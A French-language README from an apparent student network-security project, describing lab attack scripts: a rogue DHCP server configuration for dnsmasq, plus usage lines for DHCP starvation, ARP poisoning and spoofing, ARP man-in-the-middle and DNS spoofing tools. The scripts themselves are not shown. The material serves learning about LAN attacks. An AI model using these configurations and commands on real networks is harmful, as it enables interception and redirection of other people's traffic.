# network-security
Repository for network security project
# Documentation des Scripts - Sécurité des Réseaux

Ce document présente les différents scripts développés dans le cadre de l'exploration des attaques réseau. Chaque script est conçu pour simuler une attaque ou exploiter une vulnérabilité spécifique.

---
# Attaque DHCP
## DHCP Spoof
Le DHCP spoofing est une attaque où un attaquant configure un serveur DHCP malveillant sur un réseau pour distribuer des informations frauduleuses, comme une fausse passerelle ou de faux DNS, afin d'intercepter ou rediriger le trafic des utilisateurs légitimes. Cela permet de mener d'autres attaques comme le man-in-the-middle.
  
Nous avons opté pour DNSMask pour effectué cette attaque, car généralement le serveur DHCP répond plus rapidement que celui légitime.

Voici la configuration simple du serveur attaquant :

```bash
sudo nano /etc/dnsmasq.conf
```
```bash
# Activer le service DHCP
dhcp-range=10.2.1.220,10.2.1.230,255.255.255.0,12h

# Définir la passerelle (gateway)
dhcp-option=3,10.2.1.254

# Optionnel : Définir le DNS (vous pouvez utiliser le même serveur ou un autre)
dhcp-option=6,8.8.8.8,8.8.4.4
```
Une fois fait, on remarque bien via cette capture Wireshark, que le serveur attaquant prend bien le relai.
(Le serveur légitime est bien lancé à ce moment de l'attaque.)
## DHCP Starvation
## 2. `dhcp_starvation.py`

## Description
Ce script exécute une attaque de DHCP starvation en inondant le serveur DHCP avec des requêtes malveillantes afin d'épuiser ses adresses IP disponibles.

## Utilisation
```bash
python dhcp_starvation.py -i <interface> [-t <target_ip>] [-p]
python dhcp_starvation.py -i eth0 -t 10.2.1.11 -p
```

# Attaque ARP
## 1. `arp_poisoning.py`

### Description
Ce script réalise une attaque d'ARP poisoning en injectant une fausse association IP ↔ MAC dans la table ARP de la victime.

### Utilisation
```bash
python arp_poisoning.py <victim_ip> <fake_mac> <interface>
python arp_poisoning.py 192.168.1.10 00:11:22:33:44:55 eth0
```
## 2. `arp_spoof.py`

## Description
Ce script effectue une attaque d'ARP spoofing en modifiant la table ARP de la victime pour associer une IP à une fausse adresse MAC.

## Utilisation
```bash
python arp_spoof.py <victim_ip> <spoof_ip> <interface>
python arp_spoof.py 192.168.1.10 192.168.1.1 eth0
```

## 3. `arp_mitm.py`

## Description
Ce script réalise une attaque Man-in-the-Middle (MITM) en manipulant les tables ARP de deux victimes pour intercepter leurs communications.

## Utilisation
```bash
python arp_mitm.py <victim_ip1> <victim_ip2> <victim_mac1> <victim_mac2> <interface>

## Attaque DNS

## 1. `dns_spoof.py`

## Description
Ce script intercepte les requêtes DNS pour un domaine spécifique et renvoie une réponse malveillante contenant une IP spoofée.

## Utilisation
```bash
python dns_spoof.py -d <spoofed_domain> -i <spoofed_ip> -n <interface>
```
